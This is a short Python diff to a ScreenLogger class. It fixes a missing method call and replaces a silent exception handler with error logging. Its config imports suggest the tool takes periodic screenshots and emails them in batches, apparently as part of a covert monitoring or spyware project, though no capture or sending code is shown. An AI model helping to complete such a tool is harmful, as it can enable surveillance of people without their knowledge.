@@ -3,7 +3,8 @@ import time
 import os
 
 from config.config import LOGS_DIRECTORY, SCREENSHOT_INTERVAL, SCREENSHOTS_PER_EMAIL
-from utils.logging_utils import timestamp
+from core.utils.logging_utils import timestamp, log_error
+
 
 class ScreenLogger:
     def __init__(self):
@@ -19,7 +20,8 @@ class ScreenLogger:
     def run(self):
         try:
             while self.running:
-                self.log_screen
+                self.log_screen()
                 time.sleep(self.interval)
-        except Exception:
-            pass # TODO: FInish this
+        except Exception as e:
+            self.running = False
+            log_error(e)
